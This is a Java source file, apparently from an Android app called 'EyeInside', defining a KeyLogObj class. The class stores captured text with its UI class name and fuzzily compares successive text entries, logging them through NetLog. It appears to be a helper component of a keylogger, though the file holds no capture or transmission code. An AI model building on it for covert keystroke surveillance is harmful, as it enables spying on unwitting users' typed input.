package com.code4bones.EyeInside;

import com.code4bones.utils.NetLog;

public class KeyLogObj {

	public enum EventState {
		NONE,
		WAIT_CLICK,
		WAIT_FOCUS,
		GOT_FOCUS
	};
	
	public String mText;
	public String mClass;
	
	public boolean mOpen = false;
	public EventState mState;
	
	public KeyLogObj(String clazz,String text) {
		mText  = text;
		mClass = clazz;
		mState = EventState.WAIT_CLICK;
	}

	public void replaceText(String text) {
		NetLog.v("REPLACE:[%s]->[%s]",mText,text);
		mText = text;
	}
	
	public boolean isEqual(String clazz,String text) {
		if (!clazz.equals(mClass) )
			return false;
		if ( text.length() == 0 || mText.length() == 0 )
			return true;
		int len = Math.min(text.length(),mText.length());
		if ( len == 0 )
			return true;
		float avg = compareAvg(mText.toCharArray(),text.toCharArray(),len - 1);
		NetLog.v("COMPARE %s->%s ( %.2f )",mText,text,avg);
		boolean ok = avg < 25.0f;
		//NetLog.v("Compare:OLD[%s](%d) to NEW[%s](%d) => %s (%d) [%.2f]",mText,mText.length(),text,text.length(),ok,len,avg);
		return ok;
	}
	
	public float compareAvg(char[] olds,char[] news,int len) {
		int errors = 0;
		int ox = 0;
		int nx = 0;
		for ( int idx = 0; idx < len;idx++) {
			//NetLog.v("n:%c o:%c",news[nx],olds[ox]);
			if ( news[nx] != olds[ox] ) {
				errors++;
				nx++;
				continue;
			}
			ox++;nx++;
		}
		
		float perc = (100*errors)/len;
		return perc;
	}
	
}
